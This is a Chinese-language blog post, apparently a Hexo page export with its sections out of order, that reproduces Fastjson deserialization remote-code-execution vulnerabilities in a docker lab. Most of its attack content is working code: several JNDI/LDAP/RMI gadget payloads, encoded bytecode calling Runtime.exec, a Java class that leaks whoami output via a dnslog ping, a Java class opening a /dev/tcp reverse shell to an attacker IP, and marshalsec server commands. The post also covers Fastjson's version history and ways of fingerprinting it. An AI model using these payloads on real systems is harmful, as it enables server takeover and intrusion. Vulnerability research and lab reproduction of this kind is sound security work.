&quot;yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARBYUFhAQAMSW5uZXJDbGFzc2VzAQAdTGNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMkQWFBYTsBAApTb3VyY2VGaWxlAQAKVGVzdDMuamF2YQwABAAFBwATAQAbY29tL2xvbmdvZm8vdGVzdC9UZXN0MyRBYUFhAQAQamF2YS9sYW5nL09iamVjdAEAFmNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAVAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAFwAYCgAWABkBAARjYWxjCAAbAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAHQAeCgAWAB8BABNBYUFhNzQ3MTA3MjUwMjU3NTQyAQAVTEFhQWE3NDcxMDcyNTAyNTc1NDI7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAAHAAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ&quot;</span><br><span class=\"line\">    ],</span><br><span class=\"line\">    &quot;_name&quot;: &quot;aaa&quot;,</span><br><span class=\"line\">    &quot;_tfactory&quot;: &#123;&#125;,</span><br><span class=\"line\">    &quot;_outputProperties&quot;: &#123;&#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload3:</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;rand1&quot;: &#123;</span><br><span class=\"line\">    &quot;@type&quot;: &quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,</span><br><span class=\"line\">    &quot;properties&quot;: &#123;</span><br><span class=\"line\">      &quot;data_source&quot;: &quot;ldap://localhost:1389/Object&quot;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload4:</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;rand1&quot;: &#123;</span><br><span class=\"line\">    &quot;@type&quot;: &quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;,</span><br><span class=\"line\">    &quot;targetBeanName&quot;: &quot;ldap://localhost:1389/Object&quot;,</span><br><span class=\"line\">    &quot;propertyPath&quot;: &quot;foo&quot;,</span><br><span class=\"line\">    &quot;beanFactory&quot;: &#123;</span><br><span class=\"line\">      &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,</span><br><span class=\"line\">      &quot;shareableResources&quot;: [</span><br><span class=\"line\">        &quot;ldap://localhost:1389/Object&quot;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload5:</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;rand1&quot;: Set[</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;,</span><br><span class=\"line\">    &quot;beanFactory&quot;: &#123;</span><br><span class=\"line\">      &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,</span><br><span class=\"line\">      &quot;shareableResources&quot;: [</span><br><span class=\"line\">        &quot;ldap://localhost:1389/obj&quot;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;adviceBeanName&quot;: &quot;ldap://localhost:1389/obj&quot;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">]&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload6:</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;rand1&quot;: &#123;</span><br><span class=\"line\">    &quot;@type&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,</span><br><span class=\"line\">    &quot;userOverridesAsString&quot;: &quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383038302f740003466f6f;&quot;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload7:</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;rand1&quot;: &#123;</span><br><span class=\"line\">    &quot;@type&quot;: &quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;,</span><br><span class=\"line\">    &quot;jndiName&quot;: &quot;ldap://localhost:1389/Object&quot;,</span><br><span class=\"line\">    &quot;loginTimeout&quot;: 0</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"实战渗透测试\"><a href=\"#实战渗透测试\" class=\"headerlink\" title=\"实战渗透测试\"></a>实战渗透测试</h1><h2 id=\"Fastjson-lt-1-2-24远程代码执行\"><a href=\"#Fastjson-lt-1-2-24远程代码执行\" class=\"headerlink\" title=\"Fastjson&lt;1.2.24远程代码执行\"></a>Fastjson&lt;1.2.24远程代码执行</h2><p>1、使用docker搭建环境<br><img src=\"/images/15/1.png\" alt=\"upload successful\"> </p>\n<p>2、访问IP:8090显示此页面表示搭建成功<br><img src=\"/images/15/2.png\" alt=\"upload successful\"> </p>\n<p>3、攻击机中dnslog.java文件，内容如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.lang.Runtime;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.lang.Process;</span><br><span class=\"line\"></span><br><span class=\"line\">public class dnslog&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    static &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            Runtime rt = Runtime.getRuntime();</span><br><span class=\"line\"></span><br><span class=\"line\">            String[] commands = &#123; &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;ping user.`whoami`.dnslog地址&quot;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">            Process pc = rt.exec(commands);</span><br><span class=\"line\"></span><br><span class=\"line\">            pc.waitFor();</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            // do nothing</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>4、使用命令javac dnslog.java编译java文件，得到dnslog.class文件。<br><img src=\"/images/15/3.png\" alt=\"upload successful\"> </p>\n<p>5、将两个文件通过python3 -m http.server命令放到外网环境中<br><img src=\"/images/15/4.png\" alt=\"upload successful\"><br><img src=\"/images/15/5.png\" alt=\"upload successful\"> </p>\n<p>6、使用marshalsec项目，启动RMI服务，监听9999端口并加载远程类dnslog.class<br><img src=\"/images/15/6.png\" alt=\"upload successful\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/mbechler/marshalsec.git</span><br><span class=\"line\">cd marshalsec/</span><br><span class=\"line\">编译项目</span><br><span class=\"line\">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>\n\n<p>成功之后，target目录下会生成marshalsec-0.0.3-SNAPSHOT-all.jar文件<br><img src=\"/images/15/7.png\" alt=\"upload successful\"> </p>\n<p>7、在当前主机通过生成的marshalsec文件运行rmi服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd target/</span><br><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.229.158:4455/#dnslog&quot; 9999</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/15/8.png\" alt=\"upload successful\"> </p>\n<p>7、在漏洞页面bp抓包后post提交数据，替换如下payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Accept:*/*</span><br><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;b&quot;:&#123;</span><br><span class=\"line\">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class=\"line\">        &quot;dataSourceName&quot;:&quot;rmi://192.168.229.158:9999/dnslog&quot;,</span><br><span class=\"line\">        &quot;autoCommit&quot;:true</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/15/9.png\" alt=\"upload successful\"></p>\n<p>8、在dnslog可以看到回显了whoami的结果为root<br><img src=\"/images/15/10.png\" alt=\"upload successful\"> </p>\n<h2 id=\"Fastjson-lt-1-2-48远程代码执行漏洞\"><a href=\"#Fastjson-lt-1-2-48远程代码执行漏洞\" class=\"headerlink\" title=\"Fastjson&lt;1.2.48远程代码执行漏洞\"></a>Fastjson&lt;1.2.48远程代码执行漏洞</h2><p>1、首先使用docker搭建环境<br><img src=\"/images/15/11.png\" alt=\"upload successful\"> </p>\n<p>2、访问8090端口显示页面表示搭建成功<br><img src=\"/images/15/12.png\" alt=\"upload successful\"> </p>\n<p>3、新建一个Exploit.java文件，内容如下，执行一个反弹shell操作。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.io.BufferedReader;</span><br><span class=\"line\">import java.io.InputStream;</span><br><span class=\"line\">import java.io.InputStreamReader;</span><br><span class=\"line\">public class Exploit&#123;</span><br><span class=\"line\">    public Exploit() throws Exception &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.4.187/4554;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;);</span><br><span class=\"line\">        InputStream is = p.getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">        BufferedReader reader = new BufferedReader(new InputStreamReader(is));</span><br><span class=\"line\"></span><br><span class=\"line\">        String line;</span><br><span class=\"line\">        while((line = reader.readLine()) != null) &#123;</span><br><span class=\"line\">            System.out.println(line);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        p.waitFor();</span><br><span class=\"line\">        is.close();</span><br><span class=\"line\">        reader.close();</span><br><span class=\"line\">        p.destroy();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public static void main(String[] args) throws Exception &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>4、使用javac命令编译Exploit.java文件，得到Exploit.class文件<br><img src=\"/images/15/13.png\" alt=\"upload successful\"><br>5、将两个文件通过python3 -m http.server命令放到外网环境中<br><img src=\"/images/15/14.png\" alt=\"upload successful\"><br><img src=\"/images/15/15.png\" alt=\"upload successful\"> </p>\n<p>6、使用工具marshalsec开启LDAP服务监听，命令如下，监听端口为6666</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.229.158:4455/#Exploit 6666</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/15/16.png\" alt=\"upload successful\"></p>\n<p>7、客户端开启监听，这里我使用windows的nc进行监听<br><img src=\"/images/15/17.png\" alt=\"upload successful\"></p>\n<p>8、抓取数据包，更换传参方式为post，放入payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Accept: */*</span><br><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;name&quot;:&#123;</span><br><span class=\"line\">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class=\"line\">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;x&quot;:&#123;</span><br><span class=\"line\">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class=\"line\">        &quot;dataSourceName&quot;:&quot;ldap://192.168.229.158:6666/Exploit&quot;,</span><br><span class=\"line\">        &quot;autoCommit&quot;:true</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/15/18.png\" alt=\"upload successful\"> </p>\n<p>9、查看监听，已经成功获取了服务器的shell<br><img src=\"/images/15/19.png\" alt=\"upload successful\">  </p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<p>FastJson为什么经常爆出安全漏洞？<br>罪魁祸首就是autoType特性, 这就是潘多拉魔盒, 永远都会存在未知安全漏洞。<br>如果说要选择一个具有代表特征的JAVA漏洞，那么我觉得是fastjson，下面介绍fastjson的两个经典漏洞复现，希望让大家对于fastjson的漏洞利用有所了解。</p>\n<h1 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h1><p>fastjson 是阿里巴巴的开源JSON解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。<br>FastJson特点如下：</p>\n<blockquote>\n<p>（1）能够支持将java bean序列化成JSON字符串，也能够将JSON字符串反序列化成Java bean。<br>（2）顾名思义，FastJson操作JSON的速度是非常快的。<br>（3）无其他包的依赖。<br>（4）使用比较方便。    </p>\n</blockquote>\n<h1 id=\"Fastjson指纹特征及判别方法\"><a href=\"#Fastjson指纹特征及判别方法\" class=\"headerlink\" title=\"Fastjson指纹特征及判别方法\"></a>Fastjson指纹特征及判别方法</h1><h2 id=\"根据返回包判断\"><a href=\"#根据返回包判断\" class=\"headerlink\" title=\"根据返回包判断\"></a>根据返回包判断</h2><p>任意抓个包，提交方式改为POST，花括号不闭合。返回包在会出现fastjson字样。</p>\n<h2 id=\"Dnslog盲打\"><a href=\"#Dnslog盲打\" class=\"headerlink\" title=\"Dnslog盲打\"></a>Dnslog盲打</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&quot;rand1&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog网址&quot;&#125;&#125;</span><br><span class=\"line\">&#123;&quot;rand2&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog网址&quot;&#125;&#125;</span><br><span class=\"line\">&#123;&quot;rand3&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog网址&quot;&#125;&#125;</span><br><span class=\"line\">&#123;&quot;rand4&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog网址&quot;&#125;&#125;&#125;</span><br><span class=\"line\">&#123;&quot;rand5&quot;:&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog网址&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">一些畸形payload，不过依然可以触发dnslog：</span><br><span class=\"line\">&#123;&quot;rand6&quot;:&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog网址&quot;&#125;&#125;&quot;&quot;&#125;&#125;</span><br><span class=\"line\">&#123;&quot;rand7&quot;:Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog网址&quot;&#125;]&#125;</span><br><span class=\"line\">&#123;&quot;rand8&quot;:Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog网址&quot;&#125;</span><br><span class=\"line\">&#123;&quot;rand9&quot;:&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog网址&quot;&#125;:0</span><br></pre></td></tr></table></figure>\n<h1 id=\"Fastjson历史漏洞\"><a href=\"#Fastjson历史漏洞\" class=\"headerlink\" title=\"Fastjson历史漏洞\"></a>Fastjson历史漏洞</h1><h2 id=\"ver-lt-1-2-24\"><a href=\"#ver-lt-1-2-24\" class=\"headerlink\" title=\"ver&lt;=1.2.24\"></a>ver&lt;=1.2.24</h2><p>1.2.24及之前没有任何防御，并且autotype默认开启。</p>\n<h2 id=\"ver-gt-1-2-25-amp-ver-lt-1-2-41\"><a href=\"#ver-gt-1-2-25-amp-ver-lt-1-2-41\" class=\"headerlink\" title=\"ver&gt;=1.2.25&amp;ver&lt;=1.2.41\"></a>ver&gt;=1.2.25&amp;ver&lt;=1.2.41</h2><p>从1.2.25开始默认关闭了autotype支持，并且加入了checkAutotype，加入了黑名单+白名单来防御autotype开启的情况。在1.2.25到1.2.41之间，发生了一次checkAutotype的绕过。</p>\n<h2 id=\"ver-1-2-42\"><a href=\"#ver-1-2-42\" class=\"headerlink\" title=\"ver=1.2.42\"></a>ver=1.2.42</h2><p>在1.2.42对1.2.25~1.2.41的checkAutotype绕过进行了修复，将黑名单改成了十进制，对checkAutotype检测也做了相应变化。黑名单改成了十进制，检测也进行了相应hash运算。</p>\n<h2 id=\"ver-1-2-43\"><a href=\"#ver-1-2-43\" class=\"headerlink\" title=\"ver=1.2.43\"></a>ver=1.2.43</h2><p>在第一个if条件之下（L开头，;结尾），又加了一个以LL开头的条件，如果第一个条件满足并且以LL开头，直接抛异常。所以这种修复方式没法在绕过了。但是上面的loadclass除了L和;做了特殊处理外，[也被特殊处理了，又再次绕过了checkAutoType。</p>\n<h2 id=\"ver-1-2-44\"><a href=\"#ver-1-2-44\" class=\"headerlink\" title=\"ver=1.2.44\"></a>ver=1.2.44</h2><p>修复了1.2.43的绕过，处理了[。删除了之前的L开头、;结尾、LL开头的判断，改成了[开头就抛异常，;结尾也抛异常，所以这样写之前的几次绕过都修复了。</p>\n<h2 id=\"ver-gt-1-2-45-amp-ver-lt-1-2-46\"><a href=\"#ver-gt-1-2-45-amp-ver-lt-1-2-46\" class=\"headerlink\" title=\"ver&gt;=1.2.45&amp;ver&lt;1.2.46\"></a>ver&gt;=1.2.45&amp;ver&lt;1.2.46</h2><p>这两个版本期间就是增加黑名单，没有发生checkAutotype绕过。</p>\n<h2 id=\"ver-1-2-47\"><a href=\"#ver-1-2-47\" class=\"headerlink\" title=\"ver=1.2.47\"></a>ver=1.2.47</h2><p>这个版本发生了不开启autotype情况下能利用成功的绕过。<br>解析一下这次的绕过：</p>\n<p>利用到了java.lang.class，这个类不在黑名单，所以checkAutotype可以过<br>这个java.lang.class类对应的deserializer为MiscCodec，deserialize时会取json串中的val值并load这个val对应的class，如果fastjson cache为true，就会缓存这个val对应的class到全局map中<br>如果再次加载val名称的class，并且autotype没开启（因为开启了会先检测黑白名单，所以这个漏洞开启了反而不成功），下一步就是会尝试从全局map中获取这个class，如果获取到了，直接返回    </p>\n<h2 id=\"ver-gt-1-2-48-amp-ver-lt-1-2-68\"><a href=\"#ver-gt-1-2-48-amp-ver-lt-1-2-68\" class=\"headerlink\" title=\"ver&gt;=1.2.48&amp;ver&lt;=1.2.68\"></a>ver&gt;=1.2.48&amp;ver&lt;=1.2.68</h2><p>在1.2.48修复了1.2.47的绕过，在MiscCodec，处理Class类的地方，设置了cache为false。在1.2.48到最新版本1.2.68之间，都是增加黑名单类</p>\n<h2 id=\"ver-1-2-68\"><a href=\"#ver-1-2-68\" class=\"headerlink\" title=\"ver=1.2.68\"></a>ver=1.2.68</h2><p>1.2.68是目前最新版，在1.2.68引入了safemode，打开safemode时，@type这个specialkey完全无用，无论白名单和黑名单，都不支持autoType了。</p>\n<h1 id=\"一些RCE-Payload\"><a href=\"#一些RCE-Payload\" class=\"headerlink\" title=\"一些RCE Payload\"></a>一些RCE Payload</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1:</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;rand1&quot;: &#123;</span><br><span class=\"line\">    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class=\"line\">    &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;,</span><br><span class=\"line\">    &quot;autoCommit&quot;: true</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload2:</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;rand1&quot;: &#123;</span><br><span class=\"line\">    &quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,</span><br><span class=\"line\">    &quot;_bytecodes&quot;: [</span><br><span class=\"line\">      